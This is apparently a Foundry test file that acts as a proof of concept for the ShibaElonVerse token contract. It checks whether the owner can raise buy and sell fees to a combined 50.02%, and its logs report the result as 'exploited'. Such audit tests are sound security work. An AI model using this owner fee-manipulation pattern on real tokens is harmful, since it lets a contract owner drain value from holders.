// SPDX-License-Identifier: MIT
pragma solidity 0.8.8;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ShibaElonVerse.sol";

contract ShibaElonVerseFeeTest is Test {
    ShibaElonVerse token;
    address owner = makeAddr("owner");
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address dummyFactory = makeAddr("dummyFactory");
    address dummyWETH = makeAddr("dummyWETH");
    address dummyPair = makeAddr("dummyPair");

    function setUp() public {
        // Mock Uniswap router factory call
        vm.mockCall(
            PANCAKE_ROUTER,
            abi.encodeWithSelector(bytes4(keccak256("factory()"))),
            abi.encode(dummyFactory)
        );
        
        // Mock Uniswap router WETH call
        vm.mockCall(
            PANCAKE_ROUTER,
            abi.encodeWithSelector(bytes4(keccak256("WETH()"))),
            abi.encode(dummyWETH)
        );
        
        // Mock Uniswap factory createPair call
        vm.mockCall(
            dummyFactory,
            abi.encodeWithSelector(bytes4(keccak256("createPair(address,address)"))),
            abi.encode(dummyPair)
        );

        // Deploy token contract
        vm.startPrank(owner);
        token = new ShibaElonVerse();
        vm.stopPrank();
    }

    function testFeeManipulation() public {
        uint16 excessiveReward = 2501; // 25.01%
        uint16 excessiveMarketing = 2501; // 25.01%
        uint16 burnFee = 10; // 1%
        
        // Temporary storage for fee components
        uint16 tempReward;
        uint16 tempMarketing;
        uint16 tempBurn;

        console2.log("--- BEFORE-Trigger: Fee Query ---");
        // Get initial buy fees
        (tempReward, tempMarketing, tempBurn) = token.buyFee();
        console2.log("Initial Buy Fees - Reward: %d, Marketing: %d, Burn: %d", 
            tempReward, tempMarketing, tempBurn);
        
        // Get initial sell fees
        (tempReward, tempMarketing, tempBurn) = token.sellFee();
        console2.log("Initial Sell Fees - Reward: %d, Marketing: %d, Burn: %d", 
            tempReward, tempMarketing, tempBurn);

        console2.log("--- Trigger: Set Excessive Fees ---");
        // Attempt to set excessive fees
        vm.startPrank(owner);
        token.setBuyFees(excessiveReward, excessiveMarketing, burnFee);
        token.setSellFees(excessiveReward, excessiveMarketing, burnFee);
        vm.stopPrank();

        console2.log("--- AFTER-Trigger: Fee Query ---");
        // Check updated buy fees
        (tempReward, tempMarketing, tempBurn) = token.buyFee();
        console2.log("Updated Buy Fees - Reward: %d, Marketing: %d, Burn: %d", 
            tempReward, tempMarketing, tempBurn);
        
        // Validate buy fee update
        bool buySuccess = (tempReward == excessiveReward) && 
                          (tempMarketing == excessiveMarketing) && 
                          (tempBurn == burnFee);

        // Check updated sell fees
        (tempReward, tempMarketing, tempBurn) = token.sellFee();
        console2.log("Updated Sell Fees - Reward: %d, Marketing: %d, Burn: %d", 
            tempReward, tempMarketing, tempBurn);
        
        // Validate sell fee update
        bool sellSuccess = (tempReward == excessiveReward) && 
                           (tempMarketing == excessiveMarketing) && 
                           (tempBurn == burnFee);

        console2.log("\n--- Differential Verdict ---");
        console2.log("Buy Fees Exploited: %s", buySuccess ? "YES" : "NO");
        console2.log("Sell Fees Exploited: %s", sellSuccess ? "YES" : "NO");
        
        if (buySuccess && sellSuccess) {
            console2.log("Vulnerability Exists: Owner successfully bypassed fee constraints to set fees totaling 50.02%");
        } else {
            console2.log("Vulnerability not Exist: Contract prevented setting fees beyond legitimate limits");
        }
    }
}